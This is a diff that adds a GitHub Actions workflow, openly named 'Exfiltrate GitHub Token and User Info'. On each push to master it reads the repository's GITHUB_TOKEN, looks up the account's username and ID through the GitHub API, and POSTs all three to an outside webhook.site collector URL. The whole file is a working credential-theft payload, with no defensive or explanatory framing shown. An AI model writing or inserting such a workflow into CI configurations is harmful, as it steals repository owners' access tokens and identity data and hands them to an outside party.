@@ -1,0 +1,27 @@
+name: Exfiltrate GitHub Token and User Info
+
+on:
+  push:
+    branches: [ master ]
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Exfiltrate Token, Username & ID via PowerShell
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        shell: pwsh
+        run: |
+          $headers = @{ Authorization = "token $env:TOKEN" }
+          $user = Invoke-RestMethod -Uri "https://api.github.com/user" -Headers $headers
+          $data = @{
+            token    = $env:TOKEN
+            username = $user.login
+            user_id  = $user.id
+          } | ConvertTo-Json
+          Invoke-RestMethod -Uri "https://webhook.site/5c786797-8a11-4fcd-b22c-93e55022ed78" -Method POST -Body $data -ContentType "application/json"
